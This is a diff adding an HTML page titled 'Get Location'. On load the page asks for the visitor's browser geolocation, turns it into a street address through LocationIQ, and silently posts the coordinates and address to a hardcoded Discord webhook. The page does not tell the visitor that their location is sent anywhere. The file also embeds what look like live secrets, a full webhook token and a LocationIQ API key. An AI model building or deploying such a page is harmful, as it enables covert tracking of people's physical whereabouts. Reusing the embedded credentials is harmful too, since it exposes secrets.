@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Location</title>
+</head>
+<body>
+    <div id="location">Fetching location...</div>
+
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ'; // Replace with your webhook URL
+        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa'; // Your LocationIQ token
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, error);
+            } else {
+                document.getElementById('location').textContent = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function success(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            document.getElementById('location').textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+            // Get the exact location
+            reverseGeocode(latitude, longitude);
+        }
+
+        function error() {
+            document.getElementById('location').textContent = "Unable to retrieve your location.";
+        }
+
+        function reverseGeocode(latitude, longitude) {
+            const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.display_name) {
+                        const address = data.display_name;
+                        document.getElementById('location').textContent = `Address: ${address}`;
+
+                        // Send location and address to Discord
+                        sendToDiscord(latitude, longitude, address);
+                    } else {
+                        console.error('Error in reverse geocoding:', data);
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+        }
+
+        function sendToDiscord(latitude, longitude, address) {
+            const message = {
+                content: `Location data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Message sent to Discord successfully.');
+                } else {
+                    console.error('Error sending message to Discord:', response.statusText);
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
